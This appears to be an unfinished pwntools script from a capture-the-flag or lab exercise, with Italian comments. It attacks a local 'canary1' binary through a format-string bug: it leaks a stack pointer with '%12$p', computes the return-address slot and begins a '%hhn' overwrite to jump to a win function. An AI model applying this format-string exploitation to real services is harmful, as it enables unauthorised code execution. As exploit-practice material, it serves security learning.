from pwn import ELF, context, p64, remote, shellcraft, asm

# il coso da eseguire
context.binary = ELF(path='./canary1')

host = 'localhost'

# TODO
# 1.  get the index of p_win izy
# 2.  get the index on the stack of RIP
# 3.  override it using printf

# 1.
p_win = 0x401272

# get a stack pointer from the stack (there are pointer written in the stack)
# used vmmap in gdb to see if it is in the stack
# for i, _ in enumerate(range(1,200)):

#     p = remote(host=host, port=4411)
#     p.sendline(f'%{i}$p'.encode())
#     res = p.recv(2_000_00)
#     print(i, res)
#     p.close()


p = remote(host=host, port=4411)
p.sendline(f'%12$p'.encode())
stack_pt = p.recv(2_000_00)
# print(stack_pt)

stack_pt = int(stack_pt, 16)
rip_pt = stack_pt + 424

p = remote(host=host, port=4411)
p.sendline(f'%hhn'.encode())
